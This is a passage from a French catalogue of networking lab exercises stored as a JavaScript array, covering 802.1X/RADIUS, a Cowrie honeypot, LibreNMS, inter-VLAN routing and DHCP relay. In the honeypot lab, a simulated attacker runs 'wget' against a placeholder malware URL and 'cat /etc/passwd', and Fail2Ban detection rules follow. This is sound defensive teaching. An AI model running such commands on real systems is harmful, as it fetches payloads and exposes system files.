          { os: "linux", cmd: "# Ajouter à la fin du fichier :\n# client switch-cisco {\n#   ipaddr = 192.168.1.1\n#   secret = MonSecretRadius\n#   shortname = SW1\n# }", commentaire: "Le secret partagé doit être identique côté switch et côté RADIUS" },
          { os: "linux", cmd: "sudo nano /etc/freeradius/3.0/users", commentaire: "Créer un utilisateur de test" },
          { os: "linux", cmd: "# Ajouter :\n# etudiant1 Cleartext-Password := \"MotDePasse123\"", commentaire: "Utilisateur etudiant1 avec mot de passe en clair (test uniquement, jamais en production)" },
          { os: "linux", cmd: "sudo systemctl restart freeradius\nsudo freeradius -X", commentaire: "Lancer en mode debug verbeux pour voir les requêtes en temps réel pendant les tests" }
        ],
        erreurs_courantes: [
          { symptome: "freeradius -X : erreur de syntaxe dans clients.conf", cause: "Accolade manquante ou mal fermée", solution: "Vérifier scrupuleusement chaque accolade { } dans la déclaration du client" }
        ]
      },
      {
        titre: "Étape 3 — Configurer le switch Cisco en authenticator",
        contexte: "Le switch doit être configuré pour utiliser AAA (Authentication, Authorization, Accounting) avec RADIUS comme backend, puis activer 802.1X sur les ports clients.",
        commandes: [
          { os: "linux", cmd: "# Configuration AAA et RADIUS sur le switch :\nSW1(config)# aaa new-model\nSW1(config)# radius server FREERADIUS\nSW1(config-radius-server)# address ipv4 192.168.1.10 auth-port 1812 acct-port 1813\nSW1(config-radius-server)# key MonSecretRadius\nSW1(config-radius-server)# exit\nSW1(config)# aaa authentication dot1x default group radius", commentaire: "Déclarer le serveur RADIUS et l'utiliser pour l'authentification 802.1X" },
          { os: "linux", cmd: "# Activer 802.1X globalement et sur le port client :\nSW1(config)# dot1x system-auth-control\nSW1(config)# interface FastEthernet0/1\nSW1(config-if)# switchport mode access\nSW1(config-if)# authentication port-control auto\nSW1(config-if)# dot1x pae authenticator", commentaire: "Le port Fa0/1 exige désormais une authentification 802.1X avant d'autoriser le trafic" },
          { os: "linux", cmd: "SW1# show dot1x all\nSW1# show authentication sessions", commentaire: "Vérifier l'état 802.1X global et les sessions en cours" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Configurer le client supplicant et tester",
        contexte: "Sur le poste client Linux, wpa_supplicant gère le protocole 802.1X côté client (habituellement utilisé pour le Wi-Fi, mais fonctionne aussi en filaire avec EAPOL).",
        commandes: [
          { os: "linux", cmd: "sudo apt install wpasupplicant -y", commentaire: "Installer wpa_supplicant sur le client" },
          { os: "linux", cmd: "sudo nano /etc/wpa_supplicant/wired.conf", commentaire: "Créer le fichier de configuration du supplicant filaire" },
          { os: "linux", cmd: "# Contenu wired.conf :\n# ctrl_interface=/var/run/wpa_supplicant\n# eapol_version=1\n# ap_scan=0\n# network={\n#   key_mgmt=IEEE8021X\n#   eap=MD5\n#   identity=\"etudiant1\"\n#   password=\"MotDePasse123\"\n# }", commentaire: "Identifiants correspondant à l'utilisateur créé dans FreeRADIUS" },
          { os: "linux", cmd: "sudo wpa_supplicant -i eth0 -D wired -c /etc/wpa_supplicant/wired.conf -d", commentaire: "Lancer le supplicant en mode debug — observer la négociation EAPOL" },
          { os: "linux", cmd: "# Sur le switch, vérifier l'authentification réussie :\nSW1# show authentication sessions interface FastEthernet0/1", commentaire: "Le statut doit passer à Authz Success après une authentification valide" },
          { os: "linux", cmd: "# Test d'échec volontaire (mauvais mot de passe) :\n# Modifier password dans wired.conf puis relancer wpa_supplicant\n# Vérifier que le port reste bloqué : show authentication sessions affiche Authz Failed", commentaire: "Confirmer que des identifiants incorrects bloquent bien l'accès réseau" }
        ],
        erreurs_courantes: [
          { symptome: "Le port reste bloqué malgré des identifiants corrects", cause: "Secret RADIUS différent entre switch et FreeRADIUS, ou type EAP non supporté", solution: "Vérifier que le secret correspond exactement des deux côtés. EAP-MD5 est simple pour un lab mais PEAP/TLS sont recommandés en production." }
        ]
      }
    ],
    checklist: [
      "freeradius -X : serveur démarré sans erreur de configuration",
      "Switch : show dot1x all confirme system-auth-control actif",
      "Authentification réussie : show authentication sessions affiche Authz Success",
      "Trafic normal (ping, etc.) fonctionne après authentification",
      "Test avec mauvais mot de passe : port reste bloqué (Authz Failed)",
      "Logs FreeRADIUS (-X) montrent les échanges Access-Request/Accept/Reject"
    ],
    tags: ["802.1x", "radius", "freeradius", "nac", "authentification", "eap", "cisco", "securite", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 120,
    titre: "Honeypot réseau — détection d'intrusion avec Cowrie",
    categorie: "securite",
    niveau: "intermédiaire",
    duree: 60,
    description: "Déployer Cowrie, un honeypot SSH/Telnet qui simule un serveur vulnérable pour attirer, journaliser et analyser les tentatives d'intrusion. Comprendre comment un honeypot permet de détecter des attaquants, d'étudier leurs techniques et d'enrichir des listes de blocage sans risquer le système réel.",
    objectifs: [
      "Comprendre le rôle d'un honeypot dans une stratégie de détection",
      "Installer et configurer Cowrie en environnement isolé",
      "Simuler des tentatives d'intrusion et analyser les logs capturés",
      "Extraire les commandes tapées par un attaquant simulé",
      "Intégrer les IPs détectées dans une liste de blocage Fail2Ban/firewall"
    ],
    prerequis: [
      { type: "vm", nom: "VM Debian 12 dédiée et isolée (jamais un honeypot sur un système de production)" },
      { type: "vm", nom: "VM Kali Linux ou machine attaquante pour simuler les tentatives" },
      { type: "reseau", nom: "Réseau isolé recommandé (VLAN dédié ou segment Host-Only) — un honeypot ne doit jamais être exposé sans contrôle" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Comprendre le principe du honeypot",
        contexte: "Un honeypot est un système volontairement vulnérable (ou semblant l'être) déployé pour attirer les attaquants, loin des vrais systèmes de production. Cowrie simule un serveur SSH/Telnet complet : il accepte n'importe quels identifiants après quelques tentatives, simule un faux système de fichiers, et journalise absolument tout ce que l'attaquant tape, sans jamais lui donner un accès réel au système.",
        commandes: [
          { os: "linux", cmd: "# Principe : Cowrie écoute sur le port 22 (ou redirige le vrai SSH ailleurs)\n# Tout attaquant qui se connecte croit accéder à un vrai serveur\n# Cowrie enregistre : IP source, identifiants tentés, commandes tapées, fichiers téléchargés", commentaire: "Comprendre ce que Cowrie capture sans donner d'accès réel" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Installer Cowrie",
        contexte: "Cowrie s'installe dans un environnement Python virtuel dédié. On déplace le vrai service SSH sur un autre port pour libérer le port 22 au honeypot.",
        commandes: [
          { os: "linux", cmd: "sudo apt install git python3-venv python3-dev libssl-dev libffi-dev build-essential -y\nsudo useradd -m -s /bin/bash cowrie", commentaire: "Installer les dépendances et créer un utilisateur dédié non privilégié" },
          { os: "linux", cmd: "sudo su - cowrie\ngit clone https://github.com/cowrie/cowrie.git\ncd cowrie\npython3 -m venv cowrie-env\nsource cowrie-env/bin/activate\npip install -r requirements.txt", commentaire: "Cloner Cowrie et installer les dépendances Python dans un venv dédié" },
          { os: "linux", cmd: "# Déplacer le vrai SSH sur un autre port (ex: 2222) :\nsudo nano /etc/ssh/sshd_config\n# Modifier : Port 2222\nsudo systemctl restart sshd", commentaire: "Libérer le port 22 pour Cowrie — le vrai SSH reste accessible sur 2222 pour l'administration" },
          { os: "linux", cmd: "cp etc/cowrie.cfg.dist etc/cowrie.cfg\nnano etc/cowrie.cfg\n# Section [ssh] : listen_endpoints = tcp:2223:interface=0.0.0.0\n# Section [output_jsonlog] : enabled = true", commentaire: "Configurer Cowrie pour écouter sur 2223 puis rediriger 22 vers 2223 via iptables" },
          { os: "linux", cmd: "# Redirection iptables 22 -> 2223 :\nsudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2223", commentaire: "Faire croire à l'attaquant qu'il se connecte sur le port standard 22" },
          { os: "linux", cmd: "bin/cowrie start\ntail -f var/log/cowrie/cowrie.log", commentaire: "Démarrer Cowrie et suivre les logs en temps réel" }
        ],
        erreurs_courantes: [
          { symptome: "Cowrie ne démarre pas : Permission denied port 22", cause: "Cowrie tourne avec un utilisateur non privilégié et tente d'écouter sur un port < 1024", solution: "Toujours faire écouter Cowrie sur un port haut (2223) puis rediriger via iptables, jamais lancer Cowrie en root directement" }
        ]
      },
      {
        titre: "Étape 3 — Simuler une attaque et analyser les logs",
        contexte: "On simule des tentatives de connexion SSH depuis la machine attaquante et on observe comment Cowrie capture tout le comportement.",
        commandes: [
          { os: "linux", cmd: "# Depuis la VM Kali (attaquante) :\nssh root@192.168.1.10\n# Tester plusieurs mots de passe — Cowrie accepte souvent après quelques tentatives (configurable)", commentaire: "Simuler une attaque par force brute basique" },
          { os: "linux", cmd: "# Une fois \"connecté\" (faux shell Cowrie), tester des commandes :\nls -la\ncat /etc/passwd\nwget http://exemple.com/malware.sh\nuname -a", commentaire: "Toutes ces commandes sont journalisées par Cowrie sans jamais s'exécuter réellement sur le système" },
          { os: "linux", cmd: "# Côté serveur Cowrie — analyser les logs :\ncat var/log/cowrie/cowrie.json | python3 -m json.tool | head -50", commentaire: "Examiner le log JSON structuré : IP source, identifiants tentés, commandes exécutées" },
          { os: "linux", cmd: "grep 'login.success\\|login.failed' var/log/cowrie/cowrie.log", commentaire: "Extraire les tentatives de connexion réussies/échouées" },
          { os: "linux", cmd: "grep 'cmd.input' var/log/cowrie/cowrie.json | python3 -c \"import sys,json; [print(json.loads(l)['input']) for l in sys.stdin]\"", commentaire: "Extraire uniquement les commandes tapées par l'attaquant" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Intégrer avec Fail2Ban pour le blocage automatique",
        contexte: "On configure Fail2Ban pour lire les logs Cowrie et bloquer automatiquement les IPs détectées comme malveillantes via le pare-feu.",
        commandes: [
          { os: "linux", cmd: "sudo apt install fail2ban -y\nsudo nano /etc/fail2ban/filter.d/cowrie.conf", commentaire: "Créer un filtre Fail2Ban personnalisé pour Cowrie" },
          { os: "linux", cmd: "# Contenu cowrie.conf :\n# [Definition]\n# failregex = HoneyPotSSHTransport,\\d+,<HOST>\\s+login attempt \\[.*\\] failed\n# ignoreregex =", commentaire: "Pattern regex pour détecter les échecs de connexion dans les logs Cowrie" },
          { os: "linux", cmd: "sudo nano /etc/fail2ban/jail.local\n# [cowrie]\n# enabled = true\n# port = 22\n# filter = cowrie\n# logpath = /home/cowrie/cowrie/var/log/cowrie/cowrie.log\n# maxretry = 3\n# bantime = 3600", commentaire: "Bannir une IP pendant 1h après 3 tentatives échouées détectées par Cowrie" },
          { os: "linux", cmd: "sudo systemctl restart fail2ban\nsudo fail2ban-client status cowrie", commentaire: "Vérifier que la jail cowrie est active" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "Cowrie démarré et écoute effectivement sur le port 22 (via redirection iptables)",
      "Vrai SSH toujours accessible sur le port 2222 pour l'administration",
      "Connexion SSH simulée depuis Kali capturée dans cowrie.log",
      "Commandes tapées par l'attaquant visibles dans cowrie.json",
      "Filtre Fail2Ban cowrie créé et jail active",
      "fail2ban-client status cowrie confirme le monitoring actif"
    ],
    tags: ["honeypot", "cowrie", "detection-intrusion", "ssh", "fail2ban", "securite", "forensics", "intermediaire"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 121,
    titre: "LibreNMS — supervision réseau dédiée avec auto-découverte",
    categorie: "supervision",
    niveau: "intermédiaire",
    duree: 75,
    description: "Déployer LibreNMS, une plateforme de supervision réseau open-source spécialisée (alternative à Zabbix/Nagios généralistes) avec auto-découverte SNMP, cartographie réseau automatique, alerting et graphiques de performance par interface. Adaptée spécifiquement à la supervision d'équipements réseau (switches, routeurs, firewalls).",
    objectifs: [
      "Installer LibreNMS via Docker",
      "Configurer l'auto-découverte SNMP sur le réseau",
      "Ajouter et superviser des équipements réseau (switch, routeur)",
      "Configurer des alertes sur l'état des interfaces et la charge",
      "Exploiter la cartographie réseau automatique"
    ],
    prerequis: [
      { type: "vm", nom: "VM Linux avec Docker et Docker Compose installés" },
      { type: "vm", nom: "Équipements réseau avec SNMP activé (switch Cisco ou routeur du lab GNS3)" },
      { type: "reseau", nom: "Réseau de supervision avec accès SNMP (port UDP 161) vers les équipements cibles" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Déployer LibreNMS via Docker",
        contexte: "LibreNMS propose une image Docker officielle avec docker-compose regroupant l'application, MariaDB et Redis.",
        commandes: [
          { os: "linux", cmd: "mkdir -p ~/librenms-docker && cd ~/librenms-docker\nwget https://raw.githubusercontent.com/librenms/docker/master/docker-compose.yml\nwget https://raw.githubusercontent.com/librenms/docker/master/.env.example -O .env", commentaire: "Récupérer les fichiers Docker Compose officiels" },
          { os: "linux", cmd: "nano .env\n# Configurer : TZ=Europe/Paris, DB_HOST=db, DB_PASSWORD=motdepasse", commentaire: "Personnaliser le fichier d'environnement" },
          { os: "linux", cmd: "docker compose up -d\ndocker compose ps", commentaire: "Démarrer la stack LibreNMS (app, db, redis, dispatcher)" },
          { os: "linux", cmd: "# Créer le premier utilisateur admin :\ndocker compose exec librenms lnms user:add -r admin -p MotDePasseAdmin admin", commentaire: "Créer le compte administrateur LibreNMS" },
          { os: "linux", cmd: "# Interface web : http://IP-VM:8000", commentaire: "Accéder à l'interface web LibreNMS" }
        ],
        erreurs_courantes: [
          { symptome: "docker compose up échoue : port 8000 déjà utilisé", cause: "Un autre service occupe le port 8000", solution: "Modifier le mapping de port dans docker-compose.yml (ex: '8080:8000')" }
        ]
      },
      {
        titre: "Étape 2 — Configurer SNMP sur les équipements et l'auto-découverte",
        contexte: "On active SNMP sur les équipements à superviser (réutilise les notions du TP DHCP Snooping ou Grafana), puis on configure la plage réseau à scanner pour l'auto-découverte.",
        commandes: [
          { os: "linux", cmd: "# Sur un switch/routeur Cisco à superviser :\nSW1(config)# snmp-server community LIBRENMS-RO RO\nSW1(config)# snmp-server location SALLE-SERVEUR\nSW1(config)# snmp-server contact admin@lab.local", commentaire: "Activer SNMP en lecture seule sur l'équipement" },
          { os: "linux", cmd: "# Côté LibreNMS — ajouter manuellement un équipement :\n# Devices > Add Device\n# Hostname : 192.168.1.1\n# SNMP Version : v2c, Community : LIBRENMS-RO\n# Add Device", commentaire: "Ajouter le premier équipement via l'interface web" },
          { os: "linux", cmd: "# Configurer l'auto-découverte de plage réseau :\ndocker compose exec librenms lnms config:set 'auto_discovery.networks' '[\"192.168.1.0/24\"]'\ndocker compose exec librenms lnms discovery:run -m", commentaire: "Scanner automatiquement tout le réseau 192.168.1.0/24 pour détecter les équipements SNMP" },
          { os: "linux", cmd: "docker compose exec librenms lnms device:list", commentaire: "Lister tous les équipements découverts et ajoutés" }
        ],
        erreurs_courantes: [
          { symptome: "Device unreachable lors de l'ajout", cause: "Communauté SNMP incorrecte ou port UDP 161 bloqué", solution: "Vérifier la communauté avec snmpwalk -v2c -c LIBRENMS-RO 192.168.1.1 depuis le serveur LibreNMS" }
        ]
      },
      {
        titre: "Étape 3 — Configurer les alertes",
        contexte: "LibreNMS propose un système d'alerting basé sur des règles (alert rules) qui déclenchent des notifications selon des seuils ou des événements (interface down, latence élevée, etc.).",
        commandes: [
          { os: "linux", cmd: "# Interface web : Alerts > Alert Rules > Create Alert Rule\n# Nom : Interface_Down\n# Condition : %ifOperStatus = 'down' AND %ifAdminStatus = 'up'\n# Sévérité : Critical", commentaire: "Créer une règle d'alerte sur les interfaces down de manière inattendue" },
          { os: "linux", cmd: "# Configurer un canal de notification (email) :\n# Alerts > Alert Transports > Add Transport\n# Type : Mail\n# Configurer le serveur SMTP", commentaire: "Configurer la destination des notifications d'alerte" },
          { os: "linux", cmd: "# Tester l'alerte en simulant une panne :\n# Sur le switch : interface FastEthernet0/1 > shutdown\n# Observer dans LibreNMS : Alerts > Active Alerts", commentaire: "Vérifier le déclenchement de l'alerte après simulation de panne" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Exploiter la cartographie réseau et les graphiques",
        contexte: "LibreNMS génère automatiquement une carte de topologie réseau basée sur les protocoles de découverte (CDP, LLDP) et des graphiques détaillés par interface.",
        commandes: [
          { os: "linux", cmd: "# Activer LLDP sur les équipements Cisco pour la cartographie :\nSW1(config)# lldp run", commentaire: "LLDP permet à LibreNMS de découvrir les liens physiques entre équipements" },
          { os: "linux", cmd: "# Interface web :\n# Maps > Network Map -> visualiser la topologie découverte automatiquement\n# Devices > [équipement] > Ports -> graphiques de trafic par interface (in/out, erreurs, utilisation)", commentaire: "Explorer la cartographie automatique et les graphiques de performance" },
          { os: "linux", cmd: "docker compose exec librenms lnms device:discover-all\ndocker compose exec librenms lnms poller:run", commentaire: "Forcer une redécouverte et un sondage manuel pour rafraîchir les données" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "docker compose ps : tous les conteneurs LibreNMS Up",
      "Interface web accessible sur http://IP-VM:8000",
      "Au moins un équipement ajouté avec SNMP fonctionnel",
      "Auto-découverte : lnms device:list montre plusieurs équipements détectés",
      "Règle d'alerte Interface_Down créée et déclenchée lors d'un test",
      "Carte réseau visible dans Maps > Network Map (LLDP actif)"
    ],
    tags: ["librenms", "supervision", "snmp", "auto-decouverte", "cartographie", "alerting", "docker", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 130,
    titre: "VLAN et routage inter-VLAN (router-on-a-stick) sur Cisco",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 80,
    description: "Segmenter un réseau en VLAN sur un switch Cisco, configurer un trunk 802.1Q vers un routeur et activer le routage inter-VLAN par sous-interfaces (router-on-a-stick). Vérifier l'isolation puis la communication contrôlée entre VLAN.",
    objectifs: [
      "Créer des VLAN et affecter des ports d'accès",
      "Configurer un lien trunk 802.1Q entre switch et routeur",
      "Créer des sous-interfaces routées (encapsulation dot1Q)",
      "Valider l'isolation L2 puis le routage L3 inter-VLAN",
      "Diagnostiquer avec show vlan, show interfaces trunk, show ip route"
    ],
    prerequis: [
      { type: "vm", nom: "Cisco Packet Tracer ou GNS3 (1 routeur, 1 switch)" },
      { type: "materiel", nom: "2-3 PC virtuels par VLAN pour tester" },
      { type: "reseau", nom: "Plan d'adressage : VLAN10=192.168.10.0/24, VLAN20=192.168.20.0/24" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Créer les VLAN et affecter les ports d'accès",
        contexte: "Sur le switch, on crée les VLAN puis on place chaque port relié à un PC en mode accès dans le bon VLAN. À ce stade, les VLAN sont totalement isolés entre eux (séparation de niveau 2).",
        commandes: [
          { os: "linux", cmd: "Switch> enable\nSwitch# configure terminal\nSwitch(config)# vlan 10\nSwitch(config-vlan)# name Direction\nSwitch(config)# vlan 20\nSwitch(config-vlan)# name Production", commentaire: "Créer les VLAN 10 et 20" },
          { os: "linux", cmd: "Switch(config)# interface fa0/1\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10\nSwitch(config)# interface fa0/2\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 20", commentaire: "Affecter les ports d'accès aux VLAN" },
          { os: "linux", cmd: "Switch# show vlan brief", commentaire: "Vérifier l'affectation des ports aux VLAN" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le port reste dans VLAN 1",
            cause: "switchport access vlan appliqué sans switchport mode access",
            solution: "Toujours définir le mode access avant d'affecter le VLAN."
          }
        ]
      },
      {
        titre: "Étape 2 — Configurer le trunk 802.1Q vers le routeur",
        contexte: "Le port du switch relié au routeur doit transporter tous les VLAN : on le passe en mode trunk avec l'encapsulation 802.1Q. Le trunk marque chaque trame avec son numéro de VLAN (tag).",
        commandes: [
          { os: "linux", cmd: "Switch(config)# interface fa0/24\nSwitch(config-if)# switchport mode trunk\nSwitch(config-if)# switchport trunk allowed vlan 10,20", commentaire: "Passer le port vers le routeur en trunk" },
          { os: "linux", cmd: "Switch# show interfaces trunk", commentaire: "Vérifier le trunk et les VLAN autorisés" }
        ],
        erreurs_courantes: [
          {
            symptome: "show interfaces trunk n'affiche rien",
            cause: "Le port n'est pas réellement en trunk (négociation DTP échouée)",
            solution: "Forcer switchport mode trunk. Sur certains switches, définir d'abord switchport trunk encapsulation dot1q."
          }
        ]
      },
      {
        titre: "Étape 3 — Router-on-a-stick : sous-interfaces sur le routeur",
        contexte: "Le routeur reçoit le trunk sur une seule interface physique, découpée en sous-interfaces (une par VLAN). Chaque sous-interface porte la passerelle du VLAN et l'encapsulation dot1Q correspondante.",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface g0/0\nR1(config-if)# no shutdown", commentaire: "Activer l'interface physique (sans IP)" },
          { os: "linux", cmd: "R1(config)# interface g0/0.10\nR1(config-subif)# encapsulation dot1Q 10\nR1(config-subif)# ip address 192.168.10.1 255.255.255.0", commentaire: "Sous-interface + passerelle VLAN 10" },
          { os: "linux", cmd: "R1(config)# interface g0/0.20\nR1(config-subif)# encapsulation dot1Q 20\nR1(config-subif)# ip address 192.168.20.1 255.255.255.0", commentaire: "Sous-interface + passerelle VLAN 20" },
          { os: "linux", cmd: "R1# show ip route\nR1# show ip interface brief", commentaire: "Vérifier les routes connectées des deux VLAN" }
        ],
        erreurs_courantes: [
          {
            symptome: "Les VLAN ne communiquent toujours pas",
            cause: "Numéro d'encapsulation dot1Q différent du numéro de VLAN, ou passerelle non définie sur les PC",
            solution: "encapsulation dot1Q <même numéro que le VLAN>. Configurer la default gateway sur chaque PC."
          }
        ]
      },
      {
        titre: "Étape 4 — Tester isolation puis routage",
        contexte: "On valide que les PC d'un même VLAN se pingent, que le routage inter-VLAN fonctionne via les passerelles, et on peut ensuite restreindre avec une ACL si besoin.",
        commandes: [
          { os: "linux", cmd: "# PC1 (VLAN10, 192.168.10.10, gw .1) ping PC3 (VLAN20, 192.168.20.10)\nping 192.168.20.10", commentaire: "Test de routage inter-VLAN" },
          { os: "linux", cmd: "# Depuis un PC :\ntracert 192.168.20.10", commentaire: "La passerelle .1 doit apparaître comme premier saut" },
          { os: "linux", cmd: "R1# show ip route\nR1# show vlan-switch 2>/dev/null || echo 'côté switch : show vlan brief'", commentaire: "Confirmer les routes et l'affectation VLAN" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "VLAN 10 et 20 créés, ports d'accès affectés (show vlan brief)",
      "Trunk 802.1Q actif vers le routeur (show interfaces trunk)",
      "Sous-interfaces g0/0.10 et g0/0.20 avec passerelles configurées",
      "PC du même VLAN se pingent entre eux",
      "Ping inter-VLAN réussi (routage via les passerelles)",
      "show ip route affiche les deux réseaux connectés"
    ],
    tags: ["vlan", "inter-vlan", "802.1q", "trunk", "cisco", "routage", "reseau", "router-on-a-stick", "dot1q"],
    date_ajout: "2026-07-03",
    source: "École"
  },

  {
    id: 131,
    titre: "Serveur DHCP Linux (isc-dhcp) et relais DHCP inter-VLAN",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 70,
    description: "Installer et configurer un serveur DHCP ISC sur Debian pour distribuer des adresses à plusieurs sous-réseaux, définir des réservations par adresse MAC, et configurer un relais DHCP (ip helper-address) sur un routeur Cisco pour desservir des VLAN distants.",
    objectifs: [
      "Installer isc-dhcp-server et déclarer des étendues (subnets)",
      "Configurer options (passerelle, DNS, bail) et réservations MAC",
      "Comprendre pourquoi le DHCP ne franchit pas un routeur (broadcast)",
      "Configurer un relais DHCP avec ip helper-address sur Cisco",
      "Diagnostiquer les baux et le trafic DHCP (DORA)"
    ],
    prerequis: [
      { type: "vm", nom: "VM Debian 12 (serveur DHCP)" },
      { type: "vm", nom: "1-2 clients Linux/Windows sur des VLAN différents" },
      { type: "reseau", nom: "Routeur Cisco avec VLAN configurés (voir TP inter-VLAN)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Installer et configurer isc-dhcp-server",
        contexte: "On installe le serveur DHCP ISC et on lui fige une IP statique (un serveur DHCP ne doit jamais être client DHCP). On déclare ensuite l'interface d'écoute.",
        commandes: [
          { os: "linux", cmd: "sudo apt update && sudo apt install -y isc-dhcp-server", commentaire: "Installer le serveur DHCP ISC" },
          { os: "linux", cmd: "# Fixer l'interface d'écoute dans /etc/default/isc-dhcp-server :\n# INTERFACESv4=\"ens18\"\nsudo nano /etc/default/isc-dhcp-server", commentaire: "Définir l'interface d'écoute du service" },
          { os: "linux", cmd: "ip a | grep ens18\n# Vérifier que le serveur a une IP statique (ex 192.168.10.2)", commentaire: "Le serveur DHCP doit être en IP fixe" }
        ],
        erreurs_courantes: [
          {
            symptome: "Le service ne démarre pas",
            cause: "Interface d'écoute non définie ou sans subnet correspondant dans dhcpd.conf",
            solution: "Chaque interface écoutée doit avoir un subnet déclaré dans dhcpd.conf."
          }
        ]
      },
      {
        titre: "Étape 2 — Déclarer les étendues et les réservations",
        contexte: "Dans dhcpd.conf, on déclare un bloc subnet par réseau à servir, avec la plage d'adresses (range), la passerelle, le DNS et la durée de bail. On ajoute une réservation figée par adresse MAC.",
        commandes: [
          { os: "linux", cmd: "# /etc/dhcp/dhcpd.conf :\noption domain-name-servers 8.8.8.8;\ndefault-lease-time 600;\nmax-lease-time 7200;\nauthoritative;", commentaire: "Options globales" },
          { os: "linux", cmd: "subnet 192.168.10.0 netmask 255.255.255.0 {\n  range 192.168.10.100 192.168.10.200;\n  option routers 192.168.10.1;\n}\nsubnet 192.168.20.0 netmask 255.255.255.0 {\n  range 192.168.20.100 192.168.20.200;\n  option routers 192.168.20.1;\n}", commentaire: "Deux étendues, une par VLAN" },
          { os: "linux", cmd: "host imprimante {\n  hardware ethernet 00:11:22:33:44:55;\n  fixed-address 192.168.10.50;\n}\nsudo systemctl restart isc-dhcp-server && sudo systemctl enable isc-dhcp-server", commentaire: "Réservation par MAC + (re)démarrage" }
        ],
        erreurs_courantes: [
          {
            symptome: "dhcpd : Configuration file errors encountered",
            cause: "Erreur de syntaxe (point-virgule manquant, accolade)",
            solution: "sudo dhcpd -t -cf /etc/dhcp/dhcpd.conf pour tester la config avant de démarrer."
          }
        ]
      },
      {
        titre: "Étape 3 — Relais DHCP pour les VLAN distants",
        contexte: "Le DHCP fonctionne par broadcast, qui ne traverse pas un routeur. Pour qu'un client d'un autre VLAN obtienne un bail, on configure ip helper-address sur la passerelle : le routeur relaie la requête en unicast vers le serveur DHCP.",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface g0/0.20\nR1(config-subif)# ip helper-address 192.168.10.2", commentaire: "Relayer les requêtes DHCP du VLAN 20 vers le serveur" },
          { os: "linux", cmd: "# Sur un client VLAN20, redemander un bail :\nsudo dhclient -r && sudo dhclient ens18   # Linux\nipconfig /release && ipconfig /renew        # Windows", commentaire: "Renouveler l'adresse côté client" },
          { os: "linux", cmd: "ip a  # ou ipconfig — l'IP doit être dans 192.168.20.100-200", commentaire: "Vérifier que le client a bien un bail du bon subnet" }
        ],
        erreurs_courantes: [
          {
            symptome: "Client VLAN distant reste en 169.254.x.x (APIPA)",
            cause: "ip helper-address absent ou subnet du VLAN non déclaré dans dhcpd.conf",
            solution: "Vérifier ip helper-address sur la sous-interface ET la présence du subnet correspondant côté serveur."
          }
        ]
      },
      {
        titre: "Étape 4 — Diagnostic des baux et du trafic",
        contexte: "On inspecte les baux attribués côté serveur et on observe l'échange DHCP (DORA : Discover, Offer, Request, Ack) pour valider le fonctionnement.",
        commandes: [
          { os: "linux", cmd: "cat /var/lib/dhcp/dhcpd.leases", commentaire: "Voir les baux attribués (IP, MAC, expiration)" },
          { os: "linux", cmd: "sudo journalctl -u isc-dhcp-server -f", commentaire: "Suivre les logs DHCP en temps réel (DHCPDISCOVER/OFFER/REQUEST/ACK)" },
          { os: "linux", cmd: "sudo tcpdump -i ens18 port 67 or port 68 -n", commentaire: "Capturer l'échange DORA sur les ports 67/68" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "isc-dhcp-server démarré, interface d'écoute définie",
      "dhcpd -t sans erreur de syntaxe",
      "Client du VLAN local obtient une IP de la plage",
      "Réservation MAC : l'hôte reçoit toujours la même IP",
      "ip helper-address configuré, client VLAN distant obtient un bail",
      "dhcpd.leases et logs confirment les attributions"
    ],
    tags: ["dhcp", "isc-dhcp", "relais-dhcp", "ip-helper", "reseau", "linux", "cisco", "vlan", "dora"],
    date_ajout: "2026-07-03",
    source: "École"
  }

];
